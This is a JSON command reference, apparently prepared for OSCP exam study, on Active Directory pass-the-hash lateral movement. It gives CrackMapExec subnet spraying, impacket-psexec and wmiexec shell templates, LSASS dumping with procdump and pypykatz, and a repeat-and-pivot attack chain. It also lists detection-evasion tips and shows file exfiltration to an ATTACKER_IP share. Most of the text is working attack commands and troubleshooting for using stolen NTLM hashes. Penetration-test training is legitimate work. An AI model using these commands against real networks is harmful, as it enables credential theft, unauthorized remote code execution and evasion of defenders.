{
  "metadata": {
    "file_purpose": "Active Directory Pass-the-Hash (PTH) attacks - Lateral movement using NTLM hashes without plaintext passwords",
    "oscp_relevance": "CRITICAL for OSCP. Pass-the-Hash is the PRIMARY lateral movement technique after obtaining credentials via DCSync, SAM dump, or LSASS memory extraction. Works with NTLM hashes alone - no password cracking needed.",
    "educational_context": "Pass-the-Hash exploits NTLM authentication's design: Windows systems authenticate using the NTLM hash directly, not the plaintext password. The NTLM challenge-response protocol proves knowledge of the hash by encrypting the server's challenge with it. An attacker possessing the hash can authenticate identically to someone with the plaintext password. This makes hash cracking optional - use the hash immediately for lateral movement while cracking runs in background.",
    "prerequisites": [
      "NTLM hash of target user (from DCSync, SAM dump, LSASS, etc.)",
      "Target user must have admin rights on target system (local or domain)",
      "Network connectivity to target (SMB port 445, WMI ports 135/dynamic)",
      "SMB signing not required (or SMB relay if signing enforced)"
    ],
    "related_techniques": [
      "DCSync (ad-dcsync-secretsdump-user.json)",
      "SAM Dump (ad-sam-dump.json)",
      "LSASS Memory Dump (ad-lsass-dump.json)",
      "CrackMapExec Enumeration (ad-crackmapexec-enum.json)",
      "Impacket Suite (various)"
    ],
    "attack_chain": [
      "1. Obtain NTLM hash (DCSync, SAM dump, memory dump)",
      "2. Identify systems where user has admin rights (CrackMapExec spray or targeted)",
      "3. Pass-the-Hash with impacket-psexec/wmiexec for command execution",
      "4. Extract additional credentials from compromised system (LSASS, registry)",
      "5. Repeat lateral movement with newly obtained hashes",
      "6. Optionally crack hashes in background for RDP/web access"
    ],
    "detection_evasion": [
      "Use wmiexec instead of psexec (no service creation, less IOCs)",
      "Use smbexec for fileless execution (no binaries on disk)",
      "Leverage existing admin sessions (mimikatz pth instead of new connections)",
      "Use service accounts for lateral movement (blends with automation)",
      "Avoid Administrator account (highly monitored, use domain users with local admin)"
    ]
  },
  "commands": [
    {
      "id": "ad-pass-the-hash-crackmapexec",
      "name": "Pass-the-Hash with CrackMapExec (Spray Multiple Targets)",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "crackmapexec smb <TARGET_RANGE> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN>",
      "description": "Test NTLM hash against multiple targets simultaneously to identify where the user has administrative access. Shows 'Pwn3d!' for systems where hash grants admin rights. FASTEST method for lateral movement discovery.",
      "variables": [
        {
          "name": "<TARGET_RANGE>",
          "description": "Target hosts (single IP, CIDR range, or hostname). Use CIDR for subnet spray.",
          "example": "192.168.50.0/24",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username whose hash you possess (without domain prefix)",
          "example": "dave",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32 hex characters, NO colons or LM portion)",
          "example": "08d7a47a6f9f66b97b1bae4178747494",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name. Use '.' for local authentication.",
          "example": "corp.com",
          "required": true
        }
      ],
      "flag_explanations": {
        "crackmapexec smb": "CrackMapExec SMB module for authentication testing and lateral movement. Rapid parallel execution across multiple targets. Essential for OSCP post-exploitation. Alternatives: crackmapexec winrm (WinRM), crackmapexec ssh (SSH).",
        "<TARGET_RANGE>": "Target specification. Single IP: 192.168.50.75. CIDR range: 192.168.50.0/24 (tests entire subnet). Hostname: DC1.corp.com. File input: -M targets.txt (one host per line). IP range: 192.168.50.70-80.",
        "-u <USERNAME>": "Username for authentication. Do NOT include domain prefix (use -d flag instead). Local admin: 'Administrator'. Domain user: 'dave'. Service account: 'sqlsvc'. Case-insensitive for Windows targets.",
        "-H <NTLM_HASH>": "NTLM hash for Pass-the-Hash authentication. Must be exactly 32 hexadecimal characters. Extract from DCSync/SAM dump output. Format: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH, use only the second half (after colon). Do NOT include LM hash or colons.",
        "-d <DOMAIN>": "Domain for authentication. NetBIOS name: 'CORP'. FQDN also accepted: 'corp.com'. For local authentication (non-domain), use '.' (period). Omitting this flag attempts local authentication by default."
      },
      "success_indicators": [
        "Output: '<IP> (Pwn3d!)' - User has LOCAL ADMINISTRATOR rights on this system",
        "Output: '<IP> [+]' - Authentication successful (may not be admin)",
        "SMB version and OS details displayed (e.g., 'Windows 10.0 Build 19041 x64')",
        "If 'Pwn3d!' shown: Ready for command execution with --exec-method or impacket-psexec"
      ],
      "failure_indicators": [
        "[-] STATUS_LOGON_FAILURE - Wrong username, hash, or domain",
        "[-] STATUS_ACCESS_DENIED - Authentication succeeded but user is NOT local admin",
        "[!] Connection Error - SMB port 445 blocked or host offline",
        "[-] SMB SessionError: STATUS_ACCOUNT_LOCKED_OUT - Account disabled/locked"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Verify hash is correct 32-character NTLM (not LM or full output). Verify username spelling (case-insensitive but must match account name). Verify domain name matches NetBIOS or FQDN. Test hash with single known-good target first: crackmapexec smb <DC_IP> -u <USER> -H <HASH> -d <DOMAIN>.",
        "STATUS_ACCESS_DENIED but authentication succeeds": "Hash is valid but user lacks local admin rights on this system. This is EXPECTED for most targets. Only systems showing 'Pwn3d!' are exploitable. Document systems where authentication works (potential targets if user's privileges increase).",
        "Connection timeout or host unreachable": "SMB port 445 blocked by firewall. Verify with: sudo nmap -p 445 -Pn <TARGET>. Alternative: Try WinRM if enabled: crackmapexec winrm <TARGET> -u <USER> -H <HASH>. Check ARP table for MAC address (layer 2 issue): arp -a.",
        "STATUS_ACCOUNT_LOCKED_OUT": "Too many failed login attempts triggered account lockout policy. Wait for lockout duration (default 30 minutes). Check policy: crackmapexec smb <DC_IP> -u <USER> -p <PASS> --pass-pol. Alternative: Use different account or request unlock from domain admin."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-pass-the-hash-impacket-psexec",
        "ad-pass-the-hash-impacket-wmiexec",
        "ad-lsass-dump-procdump"
      ],
      "alternatives": [
        "ad-pass-the-hash-impacket-psexec",
        "ad-pass-the-hash-impacket-wmiexec"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASS_THE_HASH",
        "LATERAL_MOVEMENT",
        "POST_EXPLOITATION",
        "OSCP:HIGH",
        "CRACKMAPEXEC",
        "ENUMERATION"
      ],
      "oscp_relevance": "high",
      "notes": "CrackMapExec is ESSENTIAL for OSCP lateral movement. The 'Pwn3d!' indicator is your green light for command execution. WORKFLOW: (1) DCSync/dump hashes, (2) Spray with CME to find admin access, (3) Execute commands on 'Pwn3d!' systems with psexec/wmiexec, (4) Dump LSASS for more creds, (5) Repeat. Time estimate: 5-30 seconds for /24 subnet spray.\n\nCOMMON MISTAKES:\n- Using full hash output with colons (use only NTLM portion: 32 hex chars)\n- Including domain prefix in username (use -d flag separately)\n- Not documenting 'Pwn3d!' systems (you'll forget which hosts grant access)\n- Assuming [-] means failure (could be non-admin auth, still valuable for enumeration)\n\nADVANCED USAGE:\nCommand execution: crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'whoami'\nModule usage: crackmapexec smb <TARGET> -u <USER> -H <HASH> -M lsassy (dump LSASS)\nDatabase: crackmapexec smb <TARGET> -u <USER> -H <HASH> --log (stores in CME database)\n\nTIME ESTIMATE: 10-60 seconds for /24 subnet (parallelized), 2-5 seconds per single host"
    },
    {
      "id": "ad-pass-the-hash-impacket-psexec",
      "name": "Pass-the-Hash with Impacket PsExec (Remote Shell)",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>",
      "description": "Execute commands or spawn interactive shell on remote Windows system using Pass-the-Hash. Uploads binary to ADMIN$ share and creates Windows service for execution. Grants SYSTEM-level access (highest privilege).",
      "variables": [
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM password hash (32 hex characters). Extract from DCSync, SAM dump, or LSASS memory.",
          "example": "08d7a47a6f9f66b97b1bae4178747494",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name or FQDN. Use '.' for local authentication on standalone systems.",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username whose hash you possess. Must have local administrator rights on target.",
          "example": "dave",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target system IP address or FQDN. Use IP for speed, FQDN for Kerberos compatibility.",
          "example": "192.168.50.75",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-psexec": "Impacket's implementation of Sysinternals PsExec tool. Creates Windows service on target for remote code execution. Uploads RemComSvc binary to ADMIN$ share, creates service, executes commands, returns output. Grants NT AUTHORITY\\SYSTEM context (highest privilege). Alternative: impacket-smbexec (no file write), impacket-wmiexec (stealthier, no service).",
        "-hashes :<NTLM_HASH>": "Pass-the-Hash authentication flag. Colon before NTLM hash means 'use empty LM hash' (standard for modern Windows). Format: -hashes LM:NTLM. Modern Windows disables LM hashing, so use -hashes :<NTLM> (colon prefix with empty LM). Full format for old systems: -hashes aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494 (first part is blank LM hash constant).",
        "<DOMAIN>/<USERNAME>": "Authentication credentials in DOMAIN/USER format. Domain: NetBIOS name ('CORP') or FQDN ('corp.com'). For local accounts on non-domain systems, use hostname or '.' as domain. Username: Account with local admin rights. Combine: corp.com/dave or CORP/Administrator.",
        "@<TARGET>": "Target system identifier. IP address: Fast, works with NTLM authentication (192.168.50.75). FQDN: Required for Kerberos authentication (CLIENT75.corp.com). IMPORTANT: Use FQDN if domain uses Kerberos exclusively. Use IP for speed and NTLM fallback in OSCP environments."
      },
      "success_indicators": [
        "Output: '[*] Requesting shares on <TARGET>....'",
        "Output: '[*] Found writable share ADMIN$'",
        "Output: '[*] Uploading file <random>.exe'",
        "Output: 'C:\\Windows\\system32>' - Interactive SYSTEM shell spawned",
        "Command: 'whoami' returns 'nt authority\\system'"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE - Wrong hash, username, or domain",
        "[-] SMB SessionError: STATUS_ACCESS_DENIED - User exists but lacks admin rights",
        "[-] share 'ADMIN$' is not writable - Not local admin OR ADMIN$ share disabled",
        "[Errno 111] Connection refused - SMB port 445 blocked or target offline"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Verify NTLM hash is exactly 32 hexadecimal characters (no spaces, colons, or extra characters). Verify username spelling matches AD account (case-insensitive). Verify domain name: Use NetBIOS ('CORP') or FQDN ('corp.com'). Test authentication with smbclient first: smbclient -U '<DOMAIN>/<USER>%<HASH>' --pw-nt-hash //<TARGET>/C$.",
        "STATUS_ACCESS_DENIED (authenticated but not admin)": "User credentials are VALID but account lacks local administrator rights on target system. Verify user is in local Administrators group OR domain group with admin rights. Test with CrackMapExec first to verify 'Pwn3d!' status: crackmapexec smb <TARGET> -u <USER> -H <HASH> -d <DOMAIN>. If shows [+] but not 'Pwn3d!', user is authenticated but NOT admin.",
        "ADMIN$ share is not writable": "POSSIBLE CAUSES: (1) User is not local admin (most common - verify group membership). (2) ADMIN$ administrative share disabled by GPO (rare, check with: net share \\\\<TARGET>). (3) Antivirus blocking write to ADMIN$ (uncommon). SOLUTION: Try alternative tools that don't require ADMIN$ write: impacket-wmiexec (uses DCOM/WMI, no file write). Or: impacket-smbexec (writes to writable share, not ADMIN$).",
        "Connection refused / Connection timeout": "SMB port 445 is blocked by firewall or target is offline. VERIFY: sudo nmap -p 445 -Pn <TARGET> (should show 'open'). ALTERNATIVES: If WinRM enabled (port 5985/5986), use evil-winrm: evil-winrm -i <TARGET> -u <USER> -H <HASH>. If RDP enabled and password cracked, use xfreerdp. Check host is reachable: ping <TARGET>."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-lsass-dump-procdump",
        "ad-sam-dump-reg-save",
        "windows-search-sensitive-files"
      ],
      "alternatives": [
        "ad-pass-the-hash-impacket-wmiexec",
        "ad-pass-the-hash-crackmapexec"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASS_THE_HASH",
        "LATERAL_MOVEMENT",
        "POST_EXPLOITATION",
        "OSCP:HIGH",
        "IMPACKET",
        "REMOTE_EXECUTION"
      ],
      "oscp_relevance": "high",
      "notes": "Impacket-psexec is the PRIMARY lateral movement tool after obtaining NTLM hashes. ADVANTAGES: (1) No password needed (hash-only authentication), (2) Grants SYSTEM privileges (higher than user's normal rights), (3) Works from Kali without Windows access. DISADVANTAGES: (1) Writes binary to disk (AV may detect), (2) Creates Windows service (logged in Event ID 7045), (3) Requires ADMIN$ write access.\n\nOSCP WORKFLOW:\n1. DCSync or dump hashes: impacket-secretsdump '<DOMAIN>/<DA>:<PASS>@<DC>'\n2. Test hash validity: crackmapexec smb <TARGET> -u <USER> -H <HASH> (look for 'Pwn3d!')\n3. Spawn shell: impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>\n4. Dump LSASS: procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp\n5. Download dump: download C:\\Users\\Public\\lsass.dmp /tmp/lsass.dmp\n6. Parse locally: pypykatz lsa minidump /tmp/lsass.dmp\n7. Repeat with new credentials\n\nSTEALTH ALTERNATIVES:\n- impacket-wmiexec: Uses WMI for execution (no service creation, stealthier)\n- impacket-smbexec: Writes to C$ or other writable share (not ADMIN$)\n- impacket-atexec: Uses Task Scheduler (less common IOC)\n\nCOMMON MISTAKES:\n- Forgetting colon before NTLM hash in -hashes flag (correct: -hashes :HASH)\n- Using IP when Kerberos required (use FQDN for Kerberos: CLIENT75.corp.com)\n- Not checking 'Pwn3d!' status first (wastes time on failed connections)\n- Using on domain controller (use wmiexec instead - less IOCs)\n\nTIME ESTIMATE: 5-15 seconds for connection establishment, instant shell thereafter"
    },
    {
      "id": "ad-pass-the-hash-impacket-wmiexec",
      "name": "Pass-the-Hash with Impacket WMIExec (Stealthy Shell)",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>",
      "description": "Execute commands on remote system via WMI using Pass-the-Hash. STEALTHIER than psexec - no service creation, no file writes to ADMIN$. Uses DCOM for semi-interactive shell. RECOMMENDED for domain controllers and high-security targets.",
      "variables": [
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM password hash (32 hex characters). Obtain from DCSync, SAM dump, LSASS memory.",
          "example": "08d7a47a6f9f66b97b1bae4178747494",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name or FQDN. Use '.' for local authentication.",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username with local admin rights on target system",
          "example": "dave",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address or FQDN",
          "example": "192.168.50.75",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-wmiexec": "Impacket tool for remote command execution via Windows Management Instrumentation (WMI). Uses DCOM (Distributed COM) to invoke WMI methods for process creation. ADVANTAGES over psexec: (1) No binaries written to disk (fileless execution), (2) No service creation (Event ID 7045 not generated), (3) Works when ADMIN$ is blocked. DISADVANTAGES: (1) Requires WMI/DCOM ports (135 + dynamic high ports), (2) Semi-interactive shell (slower than psexec), (3) Logged in WMI event logs (Event ID 4648, 4624 Type 3).",
        "-hashes :<NTLM_HASH>": "Pass-the-Hash authentication. Colon prefix indicates empty LM hash (modern Windows standard). Full format: -hashes LM:NTLM. For modern systems: -hashes :NTLM (LM portion is aad3b435b51404eeaad3b435b51404ee constant). Extract NTLM hash from: (1) DCSync output (second hash in krbtgt:502:LM:NTLM::: format), (2) SAM dump, (3) LSASS memory dump, (4) Hashcat potfile after cracking (if you need plaintext).",
        "<DOMAIN>/<USERNAME>": "Authentication credentials. Domain: NetBIOS name ('CORP') or FQDN ('corp.com'). For local accounts: Use '.' as domain OR computer name. Username: Must have local administrator OR 'DCOM Users' group membership. Combined format: corp.com/dave OR .\\Administrator (local admin). Case-insensitive but must match exact account name.",
        "@<TARGET>": "Target system IP or hostname. IP: 192.168.50.75 (fast, works with NTLM). FQDN: CLIENT75.corp.com (required for Kerberos). For domain controllers, PREFER FQDN to enable Kerberos authentication (stealthier than NTLM). Check DNS resolution: nslookup <FQDN>. If DNS fails, use -target-ip flag: impacket-wmiexec -target-ip <IP> <DOMAIN>/<USER>@<FQDN>."
      },
      "success_indicators": [
        "Output: '[*] SMBv3.0 dialect used' - SMB connection established",
        "Output: 'C:\\>' - Semi-interactive shell spawned (SYSTEM or user context)",
        "Command: 'whoami' returns '<DOMAIN>\\<USERNAME>' OR 'nt authority\\system'",
        "No service creation logged (check with: sc query | findstr Remote)",
        "Commands execute and return output (slower than psexec but functional)"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE - Invalid hash, username, or domain",
        "[-] SMB SessionError: STATUS_ACCESS_DENIED - Authentication succeeds but not admin",
        "[-] DCERPC Runtime Error: rpc_s_access_denied - WMI/DCOM permissions insufficient",
        "[Errno 111] Connection refused - RPC port 135 blocked or WMI disabled"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Hash, username, or domain incorrect. VERIFY: (1) NTLM hash is exactly 32 hex characters (check with: echo <HASH> | wc -c, should output 33 including newline). (2) Username matches AD account (check: net user <USERNAME> /domain). (3) Domain is NetBIOS or FQDN (verify: echo %USERDNSDOMAIN%). TEST: Use crackmapexec first to validate credentials: crackmapexec smb <TARGET> -u <USER> -H <HASH> -d <DOMAIN>.",
        "STATUS_ACCESS_DENIED (authenticated but failed)": "User credentials are VALID but lacks privileges for WMI execution. REQUIRED: Local Administrators OR DCOM Users group membership. VERIFY: (1) Test with CME: crackmapexec smb <TARGET> -u <USER> -H <HASH> (should show 'Pwn3d!'). (2) Check group membership: net user <USERNAME> /domain | findstr 'Local Group'. SOLUTION: If user is admin on OTHER systems, pivot there first. Or escalate privileges on target.",
        "DCERPC Runtime Error: rpc_s_access_denied": "WMI/DCOM permissions issue. CAUSES: (1) User not in Administrators or DCOM Users group (verify with whoami /groups). (2) WMI namespace permissions restricted by GPO (rare). (3) DCOM authentication level too high (registry: HKLM\\Software\\Microsoft\\Ole\\LegacyAuthenticationLevel). ALTERNATIVES: If WMI blocked, try psexec: impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>. Or smbexec: impacket-smbexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>.",
        "Connection refused on port 135": "RPC Endpoint Mapper (port 135) is blocked by firewall OR WMI service disabled. VERIFY: (1) Port scan: sudo nmap -p 135,445 -Pn <TARGET>. Port 135 should show 'open'. (2) WMI service status (if you have shell): sc query winmgmt. ALTERNATIVES: Use psexec (only needs port 445): impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>. Or if WinRM enabled: evil-winrm -i <TARGET> -u <USER> -H <HASH>."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-lsass-dump-procdump",
        "ad-sam-dump-reg-save",
        "windows-search-sensitive-files"
      ],
      "alternatives": [
        "ad-pass-the-hash-impacket-psexec",
        "ad-pass-the-hash-crackmapexec"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASS_THE_HASH",
        "LATERAL_MOVEMENT",
        "POST_EXPLOITATION",
        "OSCP:HIGH",
        "IMPACKET",
        "WMI",
        "STEALTH"
      ],
      "oscp_relevance": "high",
      "notes": "WMIExec is the RECOMMENDED method for stealthy lateral movement in OSCP. WHEN TO USE: (1) Targeting domain controllers (less forensic footprint), (2) ADMIN$ share is disabled/blocked, (3) AV detects psexec service creation, (4) Need to avoid Event ID 7045 (service creation) alerts.\n\nSTEALTH COMPARISON:\nPsExec: Writes binary (RemComSvc.exe) to ADMIN$, creates service (Event 7045), deletes after. HIGH IOC.\nWMIExec: No file write, no service, uses existing WMI infrastructure. MEDIUM IOC (Event 4648, 4624 Type 3).\nSMBExec: Writes batch file to C$ or other writable share, executes via service. MEDIUM IOC.\nAtExec: Uses Task Scheduler (schtasks.exe), creates scheduled task. LOW IOC (uncommon technique).\n\nOSCP WORKFLOW:\n1. Obtain NTLM hash (DCSync or dump)\n2. Verify admin access: crackmapexec smb <TARGET> -u <USER> -H <HASH> (look for 'Pwn3d!')\n3. Spawn shell: impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>\n4. Execute commands: whoami, net user, reg query, etc.\n5. Dump SAM/LSASS for additional credentials\n6. Download files via SMB: copy <FILE> \\\\<ATTACKER_IP>\\share\\\n7. Lateral movement to next system\n\nCOMMON MISTAKES:\n- Expecting fully interactive shell (it's SEMI-interactive, slower response than psexec)\n- Using wmiexec when psexec would work (wmiexec is slower, use when stealth needed)\n- Not opening required firewall ports (135 + dynamic high ports 49152-65535)\n- Forgetting colon before NTLM hash in -hashes flag\n\nPERFORMANCE:\n- Slower than psexec (each command creates new WMI process)\n- Output may be delayed (1-3 seconds per command)\n- Large file operations are SLOW (use SMB copy instead)\n- Interactive programs (like mimikatz) don't work well (use one-line commands)\n\nBEST PRACTICES:\n- Use FQDN on domain controllers for Kerberos authentication (stealthier)\n- One-line commands work best: type C:\\Users\\Public\\passwords.txt\n- For file transfers, use SMB: impacket-smbserver share /tmp -smb2support\n- Combine with procdump for LSASS: procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp\n\nTIME ESTIMATE: 5-10 seconds connection, 1-3 seconds per command execution"
    }
  ]
}
